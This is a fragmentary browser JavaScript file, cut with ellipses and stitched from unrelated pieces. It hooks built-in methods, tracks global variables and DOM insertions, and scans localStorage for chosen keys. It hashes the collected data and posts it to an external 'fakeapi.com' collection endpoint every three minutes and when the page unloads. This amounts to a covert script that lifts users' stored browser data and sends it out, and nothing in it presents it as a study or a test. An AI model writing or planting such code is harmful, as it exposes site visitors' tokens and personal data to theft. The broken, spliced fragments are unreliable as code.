...
const jshook = (key, method) => {
  const originalMethod = window[key][method];
  window[key][method] = function (...args) {
    console.log(`Method ${method} of ${key} was called with arguments:`, args);
    return originalMethod.apply(this, args);
  };
};
for (let key of ["Date", "Math", "Array"]) {
  jshook(key, "toString");
}
for (let key of globalVariables) {
  trackSet.add(key);
}
!function (e) {
  "use strict";
...
window.addEventListener("DOMNodeInserted", e => trackSet.add(e.target.nodeName), false);
function obtainHashCode(obj) {
  const keys = Object.keys(obj);
  const keyString = keys.sort().join("");
  let hash = 0;
  for (let i = 0; i < keyString.length; i++) {
    const character = keyString.charCodeAt(i);
...
function scanLocalStorage() {
  const resultData = {};
  const presentKeys = Object.keys(localStorage);
  for (const key of presentKeys) {
    if (keysToObserve.includes(key)) {
      resultData[key] = window.localStorage[key];
    }
  }
  return resultData;
}
...
// MC
const apiEndpoint = "https://fakeapi.com/api/collect";
async function uploadTrackedData(data) {
  const hash = obtainHashCode(data);
  ...
  return response.ok ? console.log("Data uploaded successfully") : console.error(`Failed to upload data with error code: ${response.status}`);
}
function getAllTrackedData() {
  const collectedData = scanLocalStorage();
  if (Object.keys(collectedData).length > 0) {
    uploadTrackedData(collectedData);
  }
  return collectedData;
}
window.onload = function () {
  setInterval(getAllTrackedData, 180000);
  window.onbeforeunload = getAllTrackedData;
};
(function ($) {
  var err_style = '';
  try {
